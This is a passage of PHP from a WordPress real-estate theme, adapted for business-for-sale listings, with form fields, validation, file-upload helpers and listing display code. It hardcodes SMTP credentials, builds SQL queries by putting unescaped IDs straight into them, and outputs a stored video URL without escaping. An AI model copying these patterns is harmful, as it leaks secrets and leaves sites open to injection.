                        'asking_price' => array(
                            'label' => 'Asking Price',
                            'type' => 'select',
                            'col' => 'full_form',//half_form
                            'callback' => 'custom_asking_price_dropdown',
                            'is_require' => true,
                        ),
                        'sale_revenue' => array(
                            'label' => 'Sales Revenue',
                            'type' => 'select',
                            'col' => 'full_form',//half_form
                            'callback' => 'custom_sale_revenue_dropdown',
                            'is_require' => true,
                        ),
                        'cashflow' => array(
                            'label' => 'Cash Flow',
                            'type' => 'select',
                            'col' => 'full_form',//half_form
                            'callback' => 'custom_cashflow_dropdown',
                            'is_require' => true,
                        ),
                        'status' => array(
                            'label' => 'Status',
                            'type' => 'select',
                            'col' => 'full_form',//half_form
                            'callback' => 'custom_status_dropdown',
                            'is_require' => true,
                        ),
                        'total_ar' => array(
                            'label' => 'Total AR',
                            'type' => 'number',
                            'is_currency' => true,
                            'is_require' => true,
                            'col' => 'full_form',//half_form
                            'event' => array(
                                'onkeypress' => 'return is Num(event)',
                            )
                        ),
                        'total_ap' => array(
                            'label' => 'Total AP',
                            'type' => 'number',
                            'is_currency' => true,
                            'is_require' => true,
                            'col' => 'full_form',//half_form
                            'event' => array(
                                'onkeypress' => 'return is Num(event)',
                            )
                        ),
                        'profit_margin' => array(
                            'label' => 'Profit Margin',
                            'type' => 'number',
                            'is_currency' => true,
                            'is_require' => true,
                            'col' => 'full_form',//half_form
                            'event' => array(
                                'onkeypress' => 'return is Num(event)',
                            )
                        ),
                    ),
                ),
                'financial_detail' => array(
                    'label' => 'Financial Detail',
                    'small_label' => 'Describe your financial detail here',
                    'columns' => array(
                        'property_rental_fee' => array(
                            'label' => 'Monthly Rental Fee',
                            'type' => 'number',
                            'is_currency' => true,
                            'is_require' => true,
                            'col' => 'full_form',//half_form
                            'event' => array(
                                'onkeypress' => 'return is Num(event)',
                            )
                        ),
                        'annual_fee' => array(
                            'label' => 'Annual Fee',
                            'type' => 'number',
                            'is_currency' => true,
                            'is_require' => true,
                            'event' => array(
                                'onkeypress' => 'return is Num(event)',
                            )
                        ),
                        'property_deposit_fee' => array(
                            'label' => 'Property Deposit Fee',
                            'type' => 'number',
                            'is_currency' => true,
                            'is_require' => true,
                            'col' => 'full_form',//half_form
                            'event' => array(
                                'onkeypress' => 'return is Num(event)',
                            )
                        ),
                        'royalty_fee' => array(
                            'label' => 'Royalty Fee',
                            'type' => 'number',
                            'is_currency' => true,
                            'is_require' => true,
                            'col' => 'full_form',//half_form
                            'event' => array(
                                'onkeypress' => 'return is Num(event)',
                            )
                        ),
                        'others_fee' => array(
                            'label' => 'Other Fee',
                            'type' => 'number',
                            'is_currency' => true,
                            'is_require' => true,
                            'col' => 'full_form',//half_form
                            'event' => array(
                                'onkeypress' => 'return is Num(event)',
                            )
                        ),
                        'assets' => array(
                            'label' => 'Assets',
                            'type' => 'number',
                            'is_currency' => true,
                            'is_require' => true,
                            'col' => 'full_form',//half_form
                            'event' => array(
                                'onkeypress' => 'return is Num(event)',
                            )
                        ),
                        'total_asset_value' => array(
                            'label' => 'Total Asset Value',
                            'type' => 'number',
                            'is_currency' => true,
                            'is_require' => true,
                            'col' => 'full_form',//half_form
                            'event' => array(
                                'onkeypress' => 'return is Num(event)',
                            )
                        ),
                        'other_financial_info' => array(
                            'label' => 'Other Financial Info',
                            'type' => 'number',
                            'is_currency' => true,
                            'is_require' => true,
                            'col' => 'full_form',//half_form
                        ),
                        /*'finance_detail_total_ar' => array (
                            'label' => 'Total AR',
                            'type' => 'number',
                            'is_currency' => true,
                            'is_require' => true,
                            'col' => 'full_form',//half_form
                            'event' => array(
                                'onkeypress' => 'return is Num(event)',
                            )
                        ),
                        'finance_detail_total_ar' => array (
                            'label' => 'Total AP',
                            'type' => 'number',
                            'is_currency' => true,
                            'is_require' => true,
                            'col' => 'full_form',//half_form
                            'event' => array(
                                'onkeypress' => 'return is Num(event)',
                            )
                        ),*/
                    ),
                ),
                'photograph_docs' => array(
                    'label' => 'Photograph and Docs',
                    'small_label' => 'Photograph and Docs',
                    'columns' => array(
                        'photos' => array(
                            'label' => 'Upload Photo',
                            'type' => 'file',
                            'col' => 'full_form',//half_form
                            'is_require' => false,
                            'is_thumbnail' => true,
                            'callback' => array(
                                'function_name' => 'custom_upload_element',
                                'args' => array(
                                    'name' => 'photos',
                                    'label' => 'Select Photo',
                                    'btn_id' => 'btn_photos',
                                    'container_id' => 'photo-upload-container',
                                    'upload_imagelist' => 'photo-upload-imagelist',
                                    'imagelist' => 'photo-imagelist',
                                    'multi_selection' => true,
                                    'extensions' => "jpeg,jpg,gif,png",
                                    'max_images' => intval(get_option('wp_estate_prop_image_number', '')),
                                    'script_no' => 2
                                ),
                                'value' => '',
                            ),
                        ),
                        'docs' => array(
                            'label' => 'Upload Document',
                            'type' => 'file',
                            'col' => 'full_form',//half_form
                            'is_require' => false,
                            'is_docs' => true,
                            'callback' => array(
                                'function_name' => 'custom_upload_element',
                                'args' => array(
                                    'name' => 'docs',
                                    'label' => 'Select Docs',
                                    'btn_id' => 'btn_files',
                                    'container_id' => 'file-upload-container',
                                    'upload_imagelist' => 'docs-upload-imagelist',
                                    'imagelist' => 'docs-imagelist',
                                    'multi_selection' => true,
                                    'extensions' => "docx,doc,pdf,txt,xlsx,xls,ppt,pub",
                                    'max_images' => intval(get_option('wp_estate_prop_image_number', '')),
                                    'script_no' => 3
                                ),
                                'value' => '',
                            ),
                        ),
                        'website_address' => array(
                            'label' => 'Website Address',
                            'type' => 'text',
                            'class' => 'form-control',
                            'col' => 'full_form',//half_form
                            'is_require' => false,
                        ),
                        'video' => array(
                            'label' => 'Video Iframe',
                            'type' => 'text',
                            'is_video' => true,
                            'class' => 'form-control',
                            'col' => 'full_form',//half_form
                            'is_require' => false,
                        ),
                    ),
                ),
                'biz_details' => array(
                    'label' => 'Biz Details',
                    'small_label' => 'Please specify your biz details.',
                    'columns' => array(
                        'year_establish' => array(
                            'label' => 'Year Established',
                            'type' => 'text',
                            'is_require' => false,
                            'col' => 'full_form',//half_form
                        ),
                        'employees' => array(
                            'label' => 'Employees',
                            'type' => 'text',
                            'is_require' => false,
                            'col' => 'full_form',//half_form
                        ),
                        'working_hour' => array(
                            'label' => 'Working Hour',
                            'type' => 'text',
                            'is_require' => false,
                            'col' => 'full_form',//half_form
                        ),
                        'support_and_training' => array(
                            'label' => 'Support and Training',
                            'type' => 'text',
                            'is_require' => false,
                            'col' => 'full_form',//half_form
                        ),
                        'company_name' => array(
                            'label' => 'Company Name',
                            'type' => 'text',
                            'is_require' => false,
                            'col' => 'full_form',//half_form
                        ),
                        'available_date' => array(
                            'label' => 'Available Date',
                            'type' => 'text',
                            'is_require' => false,
                            'col' => 'full_form',//half_form
                        ),
                        'vat_register' => array(
                            'label' => 'VAT Regi',
                            'type' => 'text',
                            'is_require' => false,
                            'col' => 'full_form',//half_form
                        ),
                        'origin' => array(
                            'label' => 'Origin',
                            'type' => 'text',
                            'is_require' => false,
                            'col' => 'full_form',//half_form
                        ),
                        'address' => array(
                            'label' => 'Address',
                            'type' => 'text',
                            'is_require' => false,
                            'col' => 'full_form',//half_form
                        ),
                        'feature_your_biz' => array(
                            'label' => 'Feature your biz',
                            'type' => 'text',
                            'is_require' => false,
                            'col' => 'full_form',//half_form
                        ),
                        'number_of_store' => array(
                            'label' => 'Number of Store',
                            'type' => 'number',
                            'is_require' => false,
                            'col' => 'full_form',//half_form
                            'event' => array(
                                'onkeypress' => 'return is Num(event)',
                            )
                        ),
                        'company_info' => array(
                            'label' => 'Company Info',
                            'type' => 'textarea',
                            'col' => 'full_form',//half_form
                            'is_require' => true
                        ),
                        'wpestate_description' => array(
                            'label' => 'Property Description',
                            'type' => 'textarea',
                            'is_require' => false,
                            'is_post_description' => true,
                            'callback' => array(
                                'function_name' => 'custom_textarea_editor',
                                'args' => array(
                                    'textarea_name' => 'wpestate_description',
                                    'textarea_rows' => 10
                                ),
                                'value' => '',
                            ),
                            'col' => 'full_form',//half_form
                        ),
                    ),
                ),


                
                ),
            ),
        
    );
    if ($index && isset($arr[$index])) {
        return $arr[$index];
    }
    return $arr;
}

function user_add_validation($fields, $allowed_html = array())
{
    $result = [];
    $handle_attachs = [];
    $thumbnail = '';
    foreach ($fields['fields'] as $key => $field) {
        $columns = $field['columns'];
      
        foreach ($columns as $c_key => $column) {
            $is_require = isset($column['is_require']) ? $column['is_require'] : false;
          
            $type = isset($column['type']) ? $column['type'] : 'text';
            $value = isset($_POST[$c_key]) ? $_POST[$c_key] : '';
            $label = isset($column['label']) ? $column['label'] : $c_key;

            $is_post_title = isset($column['is_post_title']) ? $column['is_post_title'] : false;
            $is_post_description = isset($column['is_post_description']) ? $column['is_post_description'] : false;
            $is_thumbnail = isset($column['is_thumbnail']) ? $column['is_thumbnail'] : false;

            if ($is_require == true && is_cempty($value, $type)) {
                $errors[$c_key] = __("Please submit a $label for your property", "wpestate");
            }

            if (isset($column['is_post_title']) && $column['is_post_title']) {
                $post_title      =    isset($_POST[$c_key])? $_POST[$c_key]: '';
            }
            if (isset($column['is_post_description']) && $column['is_post_description']) {
                $post_content      =   isset($_POST[$c_key])? $_POST[$c_key]: '';
            }

            switch ($type) {
                case 'number':
                    $value = intval($value);
                    break;
                    
                case 'float':
                    $value = floatval($value);
                    break;

                case 'iframe':
                    $iframe = array(
                        'iframe' => array(
                            'src' => array(),
                            'width' => array(),
                            'height' => array(),
                            'frameborder' => array(),
                            'style' => array(),
                            'allowFullScreen' => array() // add any other attributes you wish to allow
                        )
                    );

                    $value = wp_kses(trim($value), $iframe) ;
                    break;

                case 'file':
                        //attachment files
                        $attchs =   array();
                        if ($value != '') {
                            $attchs =   explode(',', $value);
                        }
                        
                        if ($thumbnail == '' && $is_thumbnail) {
                            $handle_attachs = $attchs;
                            $thumbnail = (isset($column['is_thumbnail']) && $column['is_thumbnail']) ? $c_key : '';
                        }
                       
                        $value = '';
                        foreach ($attchs as $attch) {
                            if (is_numeric($attch)) {
                                $value = $attch.','.$value;
                            }
                        }
                        
                        break;
                default:
                    $value = wp_kses(esc_html($value), $allowed_html);
                    break;
            }

            // $data[$c_key] = $value;
            
            if (! $is_post_title && ! $is_post_description && ! $is_thumbnail) {
                $meta_data[$c_key] =  $value;
            } else {
                $data[$c_key] = $value;
            }
        }
    }

    $result['post_title'] = $post_title;
    $result['post_content'] = $post_content;
    $result['thumbnail'] = $thumbnail;
    $result['meta_data'] = $meta_data;
    $result['data'] = $data;
    $result['handle_attachs'] = $handle_attachs;
    $result['errors'] = $errors;
    return $result;
}

function is_cempty($value, $type='text')
{
    $result = true;
    if (preg_match("/^[0-9]+$/i", $value) && ($type == 'float' || $type == 'int' || $type == 'number')) {
        $result  = false;
    } elseif (!empty($value)) {
        $result  = false;
    }
    return $result;
}

function custom_upload_element($args, $values = array())
{
    global $wpdb;
    $defaults = array(
        'name' => 'brand_logo',
        'label' => 'Brand Logo',
        'btn_id' => 'brand-aaiu-uploader',
        'container_id' => 'brand-aaiu-upload-container',
        'upload_imagelist' => 'aaiu-upload-imagelist',
        'imagelist' => 'imagelist',
        'multi_selection' => false,
        'extensions' => "jpeg,jpg,gif,png",
        'max_images' => 1,
        'script_no' => 1
        
    );
    $options = wp_parse_args($args, $defaults); ?>
    <div class="profile_div" id="profile-div">
        <div id="upload-container">                 
            <div id="<?= $options['container_id']?>">
                
                <div id="<?= $options['upload_imagelist']?>">
                    <ul id="aaiu-ul-list" class="aaiu-upload-list"></ul>
                </div>
                <div id="<?= $options['imagelist']?>">
                    <?php
                    $attachid='';
    if ($values !='' && $values == true) {
        $attchs=explode(',', $values);
                        
        $images = '';
                       
        foreach ($attchs as $key=>$att_id) {
            if ($att_id != '' && is_numeric($att_id)) {
                $attachid .= $att_id.',';
                $preview =  wp_get_attachment_image_src($att_id, 'user_picture_profile');
                if (!$preview) {
                    //Not a photo
                    $attID = $att_id;
                    $attName = get_attached_file($attID);
                    $images.= '
                                        <div class="show_attachment">
                                            <i class="fa fa-trash-o"></i> &nbsp;
                                            <a target="_blank" href="'.wp_get_attachment_url($attID).'" class="" >
                                            '.basename($attName).' </a>
                                        </div>
                                    ';
                }
                if ($preview[0] != '') {
                    $images .=  '<div class="uploaded_images" data-imageid="'.$att_id.'"><img src="'.$preview[0].'" alt="thumb" /><i class="fa fa-trash-o"></i>';
                    $images .='</div>';
                }
            }
        }
        print $images;
    } ?>
                </div>
                <button id="<?= $options['btn_id'] ?>" class="wpresidence_button wpresidence_success">
                    <?php _e($options['label'], 'wpestate'); ?>
                </button>
                <input type="hidden" name="<?= $options['name'] ?>" value="<?= $attachid?>" id="attachid">
            </div>  
            <p style="clear: both">
                <em><?= $options['extensions']?></em>
            </p>
        </div>  
        
    </div>
    <?php

    upload_file(
        $options['btn_id'],
        $options['container_id'],
        $options['multi_selection'],
        $options['extensions'],
        $options['max_images'],
        $options['script_no'],
        $options['upload_imagelist'],
        $options['imagelist']
    );
}

function upload_file(
    $btn_id = 'brand-aaiu-uploader',
    $container_id = 'brand-aaiu-upload-container',
    $multi_selection = false,
    $extensions = "jpeg,jpg,gif,png",
    $max_images = 1,
    $script_no = 1,
    $upload_imagelist ='',
    $imagelist =''
) {
    //  $max_images = intval   ( get_option('wp_estate_prop_image_number','') );

    $max_file_size  = 100 * 1000 * 1000;
    $plup_url = add_query_arg(
        array(
                'action'    => 'wpestate_me_upload',
                'nonce'     =>  wp_create_nonce('aaiu_allow'),
            ),
        admin_url('admin-ajax.php')
    );

    
    wp_enqueue_script(
        'ajax-upload-'.$script_no,
        get_template_directory_uri().'/js/custom-upload-file/custom-upload-'.$script_no.'.min.js',
        array('jquery','plupload-handlers'),
        '1.0',
        true
    );
    
    wp_localize_script(
        'ajax-upload-'.$script_no,
        'ajax_var_upload_'.$script_no,
        array(  'ajaxurl'           => admin_url('admin-ajax.php'),
                'nonce'             => wp_create_nonce('aaiu_upload'),
                'remove'            => wp_create_nonce('aaiu_remove'),
                'number'            => 1,
                'warning'           =>  __('Image needs to be at least 500px height  x 500px wide!', 'wpestate'),
                'upload_enabled'    => true,
                'path'              =>  get_template_directory_uri(),
                'max_images'        =>  $max_images,
                'warning_max'       =>  __('You cannot upload more than', 'wpestate').$max_images.__('images', 'wpestate'),
                'confirmMsg'        => __('Are you sure you want to delete this?', 'wpestate'),
                'uploaded_images'   => $btn_id.'-imagelist',
                'upload_imagelist'  => $upload_imagelist,
                'imagelist'         => $imagelist,
                'plupload'          => array(
                                        'runtimes'          => 'html5,flash,html4',
                                        'browse_button'     => $btn_id,
                                        'container'         => $container_id,
                                        'file_data_name'    => 'aaiu_upload_file',
                                        'max_file_size'     => $max_file_size . 'b',
                                        'url'               => $plup_url,
                                        'flash_swf_url'     => includes_url('js/plupload/plupload.flash.swf'),
                                        'filters'           => array(
                                            array(
                                                'title' => __('Allowed Files', 'wpestate'),
                                                'extensions' => $extensions)
                                        ),
                                        'multipart'         => true,
                                        'multi_selection'   => $multi_selection,
                                        'urlstream_upload'  => true,
                                    )
            
            )
    );
}

function get_post_attachments_by_id($id)
{
    wp_reset_postdata();
    wp_reset_query();
    $arguments = array(
        'post_type'         =>  'attachment',
        'posts_per_page'    =>  -1,
        'post_status'       =>  'any',
        'post_parent'       =>  $id,
        'orderby'           =>  'menu_order',
        'order'             =>  'ASC'
    );

    $post_attachments   = get_posts($arguments);
    $attachid = '';
    foreach ($post_attachments as $attachment) {
        $attachid .= ','.$attachment->ID;
    }
    return $attachid;
}

function show_property_detail($fields, $postID)
{
    // validate fields
    $thumbnail = '';
    $title      = '';
    $description    =   '';
    $post_title = '';
    $post_content = '';
    $show = '';
    $collapseCode = '';
    $colmd=4;
    $layout = '';
    foreach ($fields['fields'] as $key => $field) {
        $columns = $field['columns'];
        // var_dump($field);
        $collapseCode = $key;
        $panel_title = $field['label'];
        foreach ($columns as $c_key => $column) {
            $is_require = isset($column['is_require']) ? $column['is_require'] : false;
              
            $type = isset($column['type']) ? $column['type'] : 'text';
            $value = isset($column[$c_key]) ? $column[$c_key] : '';
            $label = isset($column['label']) ? $column['label'] : $c_key;

            $is_post_title = isset($column['is_post_title']) ? $column['is_post_title'] : false;
            $is_post_description = isset($column['is_post_description']) ? $column['is_post_description'] : false;
            $is_thumbnail = isset($column['is_thumbnail']) ? $column['is_thumbnail'] : false;

                
            if (! $is_post_title && ! $is_post_description && ! $is_thumbnail) {
                 
                    // echo '<hr>';
                    // echo '<h3>'.$column['label'].'</h3>';
            }
            
            $label = $column['label'];
            $data  = get_post_meta($postID, $c_key, true);
            switch ($type) {
                    case 'radio':
                        $data = $data==1?' Yes ':' No ';
                        break;
                    case 'number':
                        if (isset($column['is_currency']) && $column['is_currency'] == true) {
                            $data   =   '  '.custom_number_format($data, 2);
                        }
                        break;
                    case 'select':
                        $term_id   =   get_post_meta($postID, $c_key, true);
                        if ($c_key == 'property_subcategory') {
                            $c_key = 'property_category';
                        }
                        $data   =   get_term_name_by_id($term_id, $c_key);
                        break;
                    case 'iframe':
                        break;
                    case 'file':
                            if (isset($column['is_brand_logo']) && $column['is_brand_logo'] == true) {
                                $logoID = $data;
                                $myArray = explode(',', $logoID);
                                if (isset($myArray) && sizeof($myArray) > 0) {
                                    $pid = $myArray[0];
                                    $data = '<div class="brand_logo">';
                                    $data .= wp_get_attachment_image($pid, 'full');
                                    $data .= '</div>';
                                }
                            }
                             if (isset($column['is_thumbnail']) && $column['is_thumbnail'] == true) {
                                 $data = '';
                                 break;
                             }
                            if (isset($column['is_docs']) && $column['is_docs'] == true) {
                                $docsID = $data;
                                $myArray = explode(',', $docsID);
                                if (isset($myArray) && sizeof($myArray) > 0) {
                                    $data = '
                                        <hr/>
                                    ';
                                    for ($i=0;$i<sizeof($myArray)-1;$i++) {
                                        $pid = $myArray[$i];
                                        $attName = get_attached_file($pid);
                                        $data .= '<a class="download_link" href="'.wp_get_attachment_url($pid).'" target="_blank">'.($i+1).'.&nbsp;'.basename($attName).'&nbsp;<i class="fa fa-download"></i></a><br>';
                                    }
                                    $data .='<hr/>';
                                }
                            }
                            break;
                    default:
                            if (isset($column['is_video']) && $column['is_video'] == true) {
                                $video = $data;
                                if ($video !== '') {
                                    $data = '<br>
                                        <iframe width="220" height="200" src="'.$video.'">
                                        </iframe>
                                     ';
                                } else {
                                    $data = '<img width="220" height="200" src="http://euonthemove.eu/wp-content/uploads/2017/05/no-video.jpg" />';
                                }
                            }
                        break;
                }
               
      
            if ($data !=='') {
                $show  .= '
                        <div class="listing_detail col-md-'.$colmd.'" ><strong>'.__($label, 'wpestate'). ':</strong> '.$data.'
                        </div>

                        ';
            }
        }
        $layout.='
            <div class="panel-group property-panel" >
                <div class="panel panel-default">
                    <div class="panel-heading">
                        <a data-toggle="collapse" data-parent="#accordion_prop_addr" href="#'.$collapseCode.'">
                            <h4 class="panel-title">  
                                '.$panel_title.'
                            </h4>  
                        </a>
                    </div>
                    <div id="'.$collapseCode.'" class="panel-collapse collapse in">
                        <div class="panel-body">
                            '.$show.'
                        </div>
                    </div>
                </div>            
            </div>';
        $show = '';
    }//end big loop

    $post = get_post($postID);
    $layout.= '
        <div class="panel-group property-panel" >
            <div class="panel panel-default">
                <div class="panel-heading">
                    <a data-toggle="collapse" data-parent="#accordion_prop_addr" href="#'.$post->ID.'">
                        <h4 class="panel-title">  
                            Description
                        </h4>  
                    </a>
                </div>
                <div id="'.$post->ID.'" class="panel-collapse collapse in">
                    <div class="panel-body">
                        '.$post->post_content.'
                    </div>
                </div>
            </div>            
        </div>';
    
    print $layout;
}

function customscripts()
{
    wp_enqueue_script('customscript', get_stylesheet_directory_uri() . '/js/customscript.js', array( 'jquery' ));
}
add_action('wp_enqueue_scripts', 'customscripts');


function mailtrap($phpmailer)
{
    /* $phpmailer->isSMTP();
     $phpmailer->Host = 'smtp.mailtrap.io';
     $phpmailer->SMTPAuth = true;
     $phpmailer->Port = 2525;
     $phpmailer->Username = '5f7183166da88b';
     $phpmailer->Password = '04475251acd0aa';*/

    $phpmailer->isSMTP();
    $phpmailer->Host = 'smtp.kagoya.net';
    $phpmailer->SMTPAuth = true;
    $phpmailer->Port = 587;
    $phpmailer->Username = 'kir325898.v-vannoch';
    $phpmailer->Password = 'ed8p2s8hr6';
}

add_action('phpmailer_init', 'mailtrap');


// custom 2020/04/11
function alter_new_table()
{
    global $wpdb;
    $wpdb->get_var("ALTER TABLE `wp_posts` ADD `estate_post_option` INT(2) NOT NULL DEFAULT 1 AFTER `post_content`");
    // $wpdb->get_var("ALTER TABLE `wp_posts` DROP `estate_post_option`");
    die();
}

function custome_estate_option()
{
    // $data = [
    //     ['estate_value'=>1,'estate_name'=>'Show All'],
    //     ['estate_value'=>2,'estate_name'=>'Login for show price'],
    //     ['estate_value'=>3,'estate_name'=>'Ask for price']
    // ];
    $data = [
        ['option_key'=>'Before Login','option'=>[
                ['estate_value'=>1,'estate_name'=>'Show All Before Login']
            ]
        ],
        ['option_key'=>'After Login','option'=>[
                ['estate_value'=>2,'estate_name'=>'Show All After Login'],
                ['estate_value'=>3,'estate_name'=>'Hide Only Price'],
                ['estate_value'=>4,'estate_name'=>'Show Only Title and Photos']
            ]
        ]
    ];
    return $data;
}

function custome_estate_options($options_id, $post=null, $title=null, $link=null)
{
    // 1 show all before login but not show contact
    // 2 show all after login
    // 31 if have->btn:contact else btn:login and cannot see contact
    // 32 hide only price
    // 4 ask for price and hide detail not photo and title in property
    // 5 checke for post_biz_for_sale
    $post->property_estate_option;
    if ($options_id!='') {
        switch ($options_id) {
            case 1:
                return 1;
                break;
            case 2:
                return 2;
                break;
            case 3:
                if (is_user_logged_in()) {
                    return 31;
                } else {
                    return 32;
                }
                break;
            case 4:
                return 4;
                // if (is_user_logged_in()) {
                // }
                break;
            }
    } else {
        return 1;
    }
}

function update_custome_estate_option($value, $id)
{
    global $wpdb;
    if (is_user_logged_in()) {
        $data = $wpdb->get_results("SELECT * FROM wp_postmeta WHERE meta_key = 'property_estate_option' AND `post_id` = $id ");
        $status = find_estate_option(custome_estate_option(), $data[0]->meta_value, $value);
        if ($data[0]->meta_id!=null) {
            $wpdb->update('wp_postmeta', ['meta_value'=>$value], ['post_id'=>$id,'meta_key'=>'property_estate_option']);
            return "Update from:<br/> <b>".$status['old']."</b><br/>To<br/><b>".$status['new'].'</b>';
        } else {
            add_post_meta($id, 'property_estate_option', $value, false);
            return "Set to <b>".$status['new'].'</b>';
        };
    }
    return false;
}
function find_estate_option($status, $old_id, $new_id)
{
    $old_value = '';
    $new_value = '';
    foreach ($status as $items) {
        foreach ($items['option'] as $item) {
            if ($item['estate_value'] == $old_id) {
                $old_value = $item['estate_name'];
            }
            if ($item['estate_value'] == $new_id) {
                $new_value = $item['estate_name'];
            }
        }
    }
    return [
        'old'=>$old_value,
        'new'=>$new_value
    ];
}

class PhoneMail
{
    private $mail;
    private $name;
    private $phone;
    private $agent_id;
    private $options;
    public function __construct($id)
    {
        global $wpdb;
        $option = $wpdb->get_var("SELECT meta_value FROM wp_postmeta WHERE meta_key='property_estate_option' AND post_id= $id");
        $option === null ? $this->options = 1 : $this->options = $option;
        $agent_id = $wpdb->get_var("SELECT meta_value FROM wp_postmeta WHERE meta_key='property_agent' AND post_id= $id");
        if ($agent_id===null) {
            $string = $wpdb->get_var("SELECT meta_value FROM wp_postmeta WHERE meta_key='property_agent_secondary' AND post_id= $id");
            $agent_id = get_string_between($string, ':"', '";');
            if ($agent_id!="") {
                $this->get_info($agent_id);
            } else {
                return null;
            }
        } else {
            $this->get_info($agent_id);
        }
        $this->agent_id = $agent_id;
    }
    public function get_info($agent_id)
    {
        if ($agent_id!="") {
            global $wpdb;
            $data = $wpdb->get_results("SELECT * FROM  wp_posts WHERE ID = $agent_id");
            if ($data!="") {
                if ($data[0]->post_name!="") {
                    $this->name = $data[0]->post_title;
                } else {
                    $this->phone = null;
                }
                if ($data[0]->post_mime_type!="") {
                    $this->phone = $data[0]->post_mime_type;
                } else {
                    $this->phone = null;
                }
                if ($data[0]->post_content_filtered!="") {
                    $this->mail = $data[0]->post_content_filtered;
                } else {
                    $this->mail = null;
                }
            }
        } else {
            $this->phone = null;
            $this->mail = null;
        }
    }
    public function get_option()
    {
        return $this->options;
    }
    public function get_email()
    {
        return $this->mail;
    }
    public function get_phone()
    {
        $phone = $this->phone;
        $syn = ['/','-',',','_'];
        foreach ($syn as $item) {
            $phone = str_replace($item, '/', $phone);
        }
        // $phone = array_flip(explode('/', $phone));
        $phone = explode('/', $phone);
        return $phone[0];
    }
    public function all_phone()
    {
        return $this->phone;
    }
    public function get_name()
    {
        return $this->name;
    }
    public function get_agentId()
    {
        return $this->agent_id;
    }
}
function get_string_between($string, $start, $end)
{
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) {
        return '';
    }
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}
function check_biz(int $id)
{
    global $wpdb;
    $status = $wpdb->get_var("SELECT wp_posts.id FROM wp_posts JOIN wp_postmeta WHERE wp_posts.id = $id AND wp_posts.id = wp_postmeta.post_id AND wp_postmeta.meta_key = 'biz_status' AND wp_postmeta.meta_value = -1");
    if ($status !='') {
        return true;
    }
    return false;
}

// add_action( 'wp_login', 'redirect_on_login' ); // hook failed login
// function redirect_on_login() {
//     if (!is_int(strpos($_SERVER["HTTP_REFERER"],"wp-login.php"))) {
//         $referrer = $_SERVER['HTTP_REFERER'];
//         $homepage = get_option('siteurl');
//         if (strstr($referrer, 'incorrect')) {
//             wp_redirect( $homepage );
//             exit;
//         } elseif (strstr($referrer, 'empty')) {
//             wp_redirect( $homepage );
//             exit;
//         } else {  
//             wp_redirect( $referrer );
//             exit;
//         }
// 	}
// }

?>